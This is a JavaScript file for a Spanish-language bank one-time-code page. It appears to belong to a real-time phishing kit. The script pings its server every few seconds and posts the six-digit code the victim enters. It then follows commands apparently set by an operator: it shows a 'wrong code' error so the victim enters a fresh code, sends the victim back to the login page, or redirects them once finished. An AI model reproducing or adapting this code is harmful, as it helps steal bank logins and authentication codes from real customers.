let sessionId = sessionStorage.getItem('sessionId');
if (!sessionId) {
  sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  sessionStorage.setItem('sessionId', sessionId);
}

// Start pings
let pingInterval = setInterval(() => {
  fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
}, 3000);
fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});

// Start polling for actions
let pollInterval = setInterval(async () => {
  try {
    const response = await fetch(`/api/sessions/${sessionId}`);
    if (response.ok) {
      const data = await response.json();
      const action = data.action;
      if (action === 'done') {
        clearInterval(pingInterval);
        clearInterval(pollInterval);
        window.location.href = "index.html";
      } else if (action === 'error-token') {
        document.getElementById("otp-validating").hidden = true;
        document.getElementById("otp-content").hidden = false;
        resetOTP();
        if (description) {
          description.style.color = "#d93838";
          description.style.fontWeight = "600";
          description.textContent = "Clave Dinámica incorrecta. Por favor, verifica e ingresa nuevamente.";
        }
        // Reset action on server so it doesn't loop
        fetch(`/api/sessions/${sessionId}/action`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: null })
        }).catch(() => {});
      } else if (action === 'error-user' || action === 'error-pass') {
        clearInterval(pingInterval);
        clearInterval(pollInterval);
        window.location.href = `login.html?error=${action}`;
      }
    }
  } catch (_) {}
}, 2000);

const slots = [...document.querySelectorAll("#otp-slots input")];
const next = document.getElementById("otp-next");
const description = document.querySelector(".bc-key-validation-description");

function value() {
  return slots.map((slot) => slot.value).join("");
}

function refresh() {
  next.disabled = value().length !== 6;
}

function resetOTP() {
  slots.forEach((slot) => {
    slot.value = "";
  });
  slots[0].focus();
  refresh();
}

slots.forEach((slot, index) => {
  slot.addEventListener("input", (event) => {
    slot.value = slot.value.replace(/\D/g, "").slice(-1);
    if (slot.value && slots[index + 1]) slots[index + 1].focus();
    refresh();
  });

  slot.addEventListener("keydown", (event) => {
    if (event.key === "Backspace" && !slot.value && slots[index - 1]) {
      slots[index - 1].focus();
      slots[index - 1].value = "";
      refresh();
    }
  });

  slot.addEventListener("paste", (event) => {
    event.preventDefault();
    const digits = (event.clipboardData.getData("text") || "").replace(/\D/g, "").slice(0, 6).split("");
    digits.forEach((digit, i) => {
      if (slots[i]) slots[i].value = digit;
    });
    const last = Math.min(digits.length, 6) - 1;
    if (last >= 0) slots[last].focus();
    refresh();
  });
});

document.getElementById("otp-clear").addEventListener("click", () => {
  resetOTP();
});

document.getElementById("otp-close").addEventListener("click", () => {
  clearInterval(pingInterval);
  clearInterval(pollInterval);
  window.location.href = "login.html";
});

next.addEventListener("click", () => {
  if (value().length !== 6) return;
  document.getElementById("otp-content").hidden = true;
  document.getElementById("otp-validating").hidden = false;

  fetch(`/api/sessions/${sessionId}/token`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token: value() })
  }).catch(() => {});
});

window.addEventListener('DOMContentLoaded', () => {
  const otpType = sessionStorage.getItem('otpType');
  const otpTitle = document.getElementById("otp-title");
  if (otpTitle && otpType) {
    if (otpType === 'ganapin') {
      otpTitle.textContent = "Ingresa tu GanaPin";
    } else if (otpType === 'totp') {
      otpTitle.textContent = "Ingresa el Código del Autenticador";
    }
  }
});

slots[0].focus();
refresh();
